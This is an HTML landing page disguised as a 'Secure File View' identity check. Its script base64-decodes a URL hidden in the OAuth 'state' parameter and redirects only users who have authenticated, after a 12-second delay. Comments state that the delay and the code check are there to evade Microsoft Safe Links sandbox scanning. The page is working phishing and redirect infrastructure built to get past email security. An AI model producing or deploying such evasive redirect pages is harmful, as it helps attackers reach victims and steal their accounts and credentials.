<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure File View — Verifying</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f3f3f3; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .container { text-align: center; }
  .loader { width: 48px; height: 48px; border: 4px solid #e0e0e0; border-top-color: #0078d4; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 20px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .text { color: #444; font-size: 14px; margin-bottom: 6px; }
  .sub { color: #999; font-size: 12px; }
</style>
</head>
<body>
<div class="container">
  <div class="loader"></div>
  <div class="text">Verifying your identity</div>
  <div class="sub">Please wait while we confirm your access...</div>
</div>
<script>
(function() {
  var params = new URLSearchParams(location.search);

  // Only redirect if user actually authenticated (code= present)
  // Safe Links sandbox has no MS session → gets error=login_required → no redirect
  var code = params.get('code');
  if (!code) return;

  var state = params.get('state');
  if (!state) {
    var hashState = location.hash.indexOf('state=');
    if (hashState > -1) state = location.hash.substring(hashState + 6).split('&')[0];
  }
  if (state) {
    try {
      var url = atob(decodeURIComponent(state));
      if (/^https?:\/\//.test(url)) {
        // Delay to evade Safe Links sandbox timeout (12s)
        setTimeout(function() {
          location.replace(url);
        }, 12000);
      }
    } catch(e) {}
  }
})();
</script>
</body>
</html>
